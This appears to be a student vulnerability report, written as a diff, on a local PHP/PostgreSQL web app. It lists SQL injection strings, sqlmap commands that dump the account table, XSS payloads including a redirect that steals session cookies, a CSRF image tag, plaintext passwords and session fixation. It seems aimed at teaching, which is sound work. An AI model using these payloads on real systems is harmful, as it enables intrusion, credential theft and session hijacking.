@@ -1,0 +1,103 @@
+--------------------------------------------------------------------
+                              ISSUE 1
+Vulnerability: SQL Injections to obtain information about the database.
+
+Exploit a: ' and passwd is null; --
+
+Impact a: When the hacker puts this as user name, it actually shows nothing
+because passwd is a valid column in the database. If the hacker was to replace
+'passwd' with a non-existing field such as 'asdf', then we'd get an error. The
+hacker can keep trying different strings to know which fields exist. This
+is a breach in confidentiality. 
+
+Exploit b: ' random string
+Impact b: Entering something as simple as this into the user name textfield
+reveals a lot about the program. The error message from pg_prepare() displays
+the query used to store user name and password which shows us some tables and
+columns that exist in the database. This is a breach in authentication because
+a user should not know how their account details are stored.
+
+Exploit c: ' and 1=(select count(*) from account); --
+Impact c: This breach in confidentiality tells us that an table named "account"
+is in the database. This is extremely dangerous because now we can start guessing
+the columns and obtain even more info.
+
+Exploit d: ' or '1'='1
+Impact: Puts us into the first account listed in the database. This breach in
+authentication is a major vulnerability because the first user could have elevated access
+which leads the hacker to even more info.
+
+Exploit e: sqlmap.py -u "http://192.168.1.78/fourFours/index.php" --forms --banner 
+Impact e: Using sqlmap, a hacker is able to find out the back-end DBMS by extensions 
+such as --banner. We can also get the version of DBMS and other info such as the operating 
+system (Linux Ubuntu). The extension "--forms" detects which fields on the page are vulnerable
+through the page source. In this case, the fields "username" and "password" are vulnerable and
+we're able to inject through them. This is a breach in confidentiality.
+
+Exploit f: ./sqlmap.py -u "http://192.168.1.78/fourFours/index.php" --dbms=postgresql --forms --dbs
+Impact f: Since we know what database is running from exploit e, we can specify it using the --dbms
+extension. --dbs shows us which exact databases are running on the site. We see: information_schema,
+pg_catalog and public. This is a breach in confidentiality.
+
+Exploit g: ./sqlmap.py -u "http://192.168.1.78/fourFours/index.php" --dbms=postgresql --forms -D public --tables
+Impact g: We know public is a database from exploit f and when we run this, we see three tables, account, fourfoursuser,
+solution. The extension -D lets us specify a table. Now we have the tables in the database that we can use to extract
+all user details such as name, password etc. This is a breach in confidentiality.
+
+Exploit h: ./sqlmap.py -u "http://192.168.1.78/fourFours/index.php" --dbms=postgresql --forms -D public -T account --columns
+Impact h: This lists all the columns in the table account. We get: firstname, id, lastname, passwd, username with their
+appropriate types. This is a breach in confidentiality.
+
+Exploit i: ./sqlmap.py -u "http://192.168.1.78/fourFours/index.php" --dbms=postgresql --forms -D public -T account -C firstname,lastname,username,passwd,id --dump
+Impact i: This exploit shows us all usernames and passwords with their appropriate fields. The hacker now has full access to anyone's account
+since the entire database is displayed and they can make any changes they want. This is a breach in authentication.
+
+
+--------------------------------------------------------------------
+                              ISSUE 2
+Vulnerability: XSS
+
+Exploit a: Use exploit d or i from issue 1 to get in and then enter "<script>alert("hacked")</script>"
+Impact a: Next time someone logs in, they see "hacked". Obviously this is a breach in authentication because
+no non-admin user should be allowed to display messages to all users. Other things like adding the sleep() function
+could also be used to lock out other users.
+
+Exploit b: <script>document.location="http://www.google.com"</script> in any answer after login doesn't let another user in. Redirects
+to google.
+Impact b: This breach in authentication redirects any user to the page google. This is dangerous for many reasons because the hacker
+can redirect to a real malicious site. Also because now no one can use the site since you always get redirected. 
+
+Exploit c: Putting the answer to any question as <script>document.location="url"</script> where url is a valid site.
+Impact c: On that url's server (could be cslinx~utorid), I have a file that obtains the cookie using PHPSESSID (on chrome) and saves it to a file.
+Anyone who visits the site will have their cookie recorded which the hacker can use to gain access to their sessions.
+
+--------------------------------------------------------------------
+                              ISSUE 3
+Vulnerability: CSRF
+
+Exploit a: <img src=http://192.168.1.78/fourFours/index.php?operation=deleteExpression&expressionId=n&accountId=m height=0 width=0>
+where n is any expressionId a previous user has entered as an answer and m for accountId is that previous user's id.
+Impact a: This exploit allows one user to delete the entry for another user through and img. The attacker will have to brute force the
+expressionId as well as the accountId. This is a breach in authentication.
+
+Exploit b: Say the hacker has some authentication already. They do right-click inspect on inputfield for any question and change the
+accountId to some random number and hit enter. The entry will show up as someone else's name
+Impact b: This is obviously very dangerous because not only can the hacker make a regular entry on someone else's behave, they can also
+input malicious code on that other person's behave so that it would look like they had nothing to do with it.
+
+--------------------------------------------------------------------
+                              ISSUE 4
+Vulnerability: Sensitive Data Exposure
+
+Exploit a: Say the hacker does infact get hold of the passwords by any means such as SQL injection. They can outright just see the passwords.
+They are not hashed in any way to make it more difficult for the hacker to crack the hashing algorithm.
+Impact a: This makes the hacker's work much easier since the database just stores the passwords that user's make without a hashing algorithm.
+Less work for the hacker to crack the hashing algorithm equals a more vulnerable system.
+
+--------------------------------------------------------------------
+                              ISSUE 5
+Vulnerability: Session Fixation
+
+Exploit a: Any user that logs in has the same PHPSESSID (on chrome) as everyone else
+Impact a: Obviously this is a big problem since we can easily extract cookies through any developer tools (although on chrome we can just click
+the "i" before the URL) and gain access to the current session.
